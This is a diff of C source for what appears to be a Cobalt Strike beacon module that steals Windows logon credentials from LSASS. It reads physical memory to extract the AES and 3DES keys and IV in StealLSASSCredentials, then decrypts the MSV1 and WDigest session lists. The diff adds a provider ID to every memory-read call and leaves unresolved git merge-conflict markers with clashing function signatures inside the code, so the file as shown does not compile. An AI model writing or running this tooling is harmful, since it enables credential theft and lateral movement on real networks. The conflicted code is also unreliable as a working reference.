@@ -101,32 +101,32 @@ DWORD GetTargetProcessInformation(PWSTR TargetProcess)
     return 0;
 }
 
-unsigned char* RetrieveBCryptKey(HANDLE hFile, DWORD64 bCryptHandleKey, DWORD lower32bits, int LsassPID, int* ReturnKeySize)
+unsigned char* RetrieveBCryptKey(HANDLE hFile, DWORD64 bCryptHandleKey, DWORD lower32bits, int LsassPID, int* ReturnKeySize, int provId)
 {
     // .process /p /r ffffde8b85e52140; db poi(poi(lsasrv!hAesKey)+0x10)+0x38
    
     // Check if the PBCRYPT_HANDLE_KEY->tag matches the string "UUUR"
     DWORD64 bCryptHandleKeyPA = 0;
     TranslateUVA2Physical(bCryptHandleKey, &bCryptHandleKeyPA, lower32bits, LsassPID);
-    unsigned char* ReadTag = ReadMultipleBytes(hFile, 4, bCryptHandleKeyPA + 4, FALSE);
+    unsigned char* ReadTag = ReadMultipleBytes(hFile, 4, bCryptHandleKeyPA + 4, FALSE, provId);
     if (memcmp(ReadTag, "UUUR", 4) == 0)
     {
         // Get the PBCRYPT_KEY81 address from PBCRYPT_HANDLE_KEY->key member
-        DWORD64 pBcryptKey81 = ReadAddressAtPhysicalAddressLocation(hFile, bCryptHandleKeyPA + 0x10);
+        DWORD64 pBcryptKey81 = ReadAddressAtPhysicalAddressLocation(hFile, bCryptHandleKeyPA + 0x10, provId);
         DWORD64 BcryptKey81PA = 0;
         TranslateUVA2Physical(pBcryptKey81, &BcryptKey81PA, lower32bits, LsassPID);
-        ReadTag = ReadMultipleBytes(hFile, 4, BcryptKey81PA + 4, FALSE);
+        ReadTag = ReadMultipleBytes(hFile, 4, BcryptKey81PA + 4, FALSE, provId);
         if (memcmp(ReadTag, "MSSK", 4) == 0)
         {
             // 0x38 is the hardkey member structure.
             // This structure has the first 4 bytes as the size of the key.
             // The next following bytes are the key
             BYTE KeyLength;
-            ReadByte(hFile, BcryptKey81PA + 0x38, &KeyLength);
+            ReadByte(hFile, BcryptKey81PA + 0x38, &KeyLength, provId);
 
             if (KeyLength != 0)
             {
-                unsigned char* RealDecryptionKey = ReadMultipleBytes(hFile, KeyLength, BcryptKey81PA + 0x38 + 4, TRUE);
+                unsigned char* RealDecryptionKey = ReadMultipleBytes(hFile, KeyLength, BcryptKey81PA + 0x38 + 4, TRUE, provId);
                 *ReturnKeySize = KeyLength;
                 return RealDecryptionKey;
             }
@@ -137,7 +137,11 @@ unsigned char* RetrieveBCryptKey(HANDLE hFile, DWORD64 bCryptHandleKey, DWORD lo
     return TRUE;
 }
 
+<<<<<<< HEAD
 BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials)
+=======
+BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMSV1Credentials, BOOL RetrieveWDigestCredentials, int provId)
+>>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
 {
     BeaconFormatPrintf(&outputbuffer, "[+] Stealing LSASS Credentials!\n");
 
@@ -150,8 +154,13 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
     BeaconFormatPrintf(&outputbuffer, "[+] Lsass PID: %d\n", LsassPID);
     
     // Get LSASS EPROCESS address
+<<<<<<< HEAD
     DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile);
     DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA, dBuildNumber);
+=======
+    DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile, provId);
+    DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA, pvWindowsVersion, provId);
+>>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
     if (LsassEprocessVA == 0)
        return FALSE;
 
@@ -197,14 +206,14 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
     // The addresses we have above are pointers to the PBCRYPT_HANDLE_KEY
     // Get the PBCRYPT_HANDLE_KEY virtual address by dereferencing the keys variables and then traverse the struct to get their actual key values
     int iAesKeyLength = 0;
-    DWORD64 hAesBCryptHandleKey = ReadAddressAtPhysicalAddressLocation(hFile, hAesKeyPhysicalAddress);
-    unsigned char* RealAesKey = RetrieveBCryptKey(hFile, hAesBCryptHandleKey, lower32bits, LsassPID, &iAesKeyLength);
+    DWORD64 hAesBCryptHandleKey = ReadAddressAtPhysicalAddressLocation(hFile, hAesKeyPhysicalAddress, provId);
+    unsigned char* RealAesKey = RetrieveBCryptKey(hFile, hAesBCryptHandleKey, lower32bits, LsassPID, &iAesKeyLength, provId);
 
     int i3DesKeyLength = 0;
-    DWORD64 h3DesBCryptHandleKey = ReadAddressAtPhysicalAddressLocation(hFile, h3DesKeyPhysicalAddress);
-    unsigned char* Real3DesKey = RetrieveBCryptKey(hFile, h3DesBCryptHandleKey, lower32bits, LsassPID, &i3DesKeyLength);
+    DWORD64 h3DesBCryptHandleKey = ReadAddressAtPhysicalAddressLocation(hFile, h3DesKeyPhysicalAddress, provId);
+    unsigned char* Real3DesKey = RetrieveBCryptKey(hFile, h3DesBCryptHandleKey, lower32bits, LsassPID, &i3DesKeyLength, provId);
 
-    unsigned char* InitializationVector = ReadMultipleBytes(hFile, 8, IVPhysicalAddress, TRUE);
+    unsigned char* InitializationVector = ReadMultipleBytes(hFile, 8, IVPhysicalAddress, TRUE, provId);
 
     BeaconFormatPrintf(&outputbuffer, "[i] hAesKey: 0x%llx\n", hAesBCryptHandleKey);
     BeaconFormatPrintf(&outputbuffer, "\t-> Real AES Key: ");
@@ -226,8 +235,13 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
         DWORD64 DataSectionOffset = GetDataSectionOffset("lsasrv.dll");
         DWORD64 ImageStartAddress = GetModuleHandleA("lsasrv.dll");
         DWORD64 DataSectionBase = ImageStartAddress + DataSectionOffset;
+<<<<<<< HEAD
         
         DWORD64 LogonSessionListHead = SearchForLogonSessionListHead(hFile, dBuildNumber, lower32bits, LsassPID, ImageStartAddress);
+=======
+
+        DWORD64 LogonSessionListHead = SearchForLogonSessionListHead(hFile, DataSectionBase, lower32bits, LsassPID, ImageStartAddress, provId);
+>>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
         if (LogonSessionListHead == 0)
         {
             BeaconFormatPrintf(&outputbuffer, "[!] Failed to obtain LogonSessionList!\n");
@@ -237,7 +251,12 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
         BeaconFormatPrintf(&outputbuffer, "\n===== [ LogonSessionList Information ] =====\n");
         BeaconFormatPrintf(&outputbuffer, "[i] LogonSessionList: 0x%llx\n\n", LogonSessionListHead);
         
+<<<<<<< HEAD
         DisplayLogonSessionListInformation(hFile, LogonSessionListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector);
+=======
+        DisplayLogonSessionListInformation(hFile, LogonSessionListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector, provId);
+        
+>>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
         FreeLibrary(hModule);
     }
 
@@ -267,7 +286,7 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
             return FALSE;
         }
 
-        DisplayWDigestLogSessListInformation(hFile, l_LogSessListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector);
+        DisplayWDigestLogSessListInformation(hFile, l_LogSessListHead, lower32bits, LsassPID, Real3DesKey, i3DesKeyLength, InitializationVector, provId);
 
         FreeLibrary(hWDModule);
         FreeLibrary(hModule);
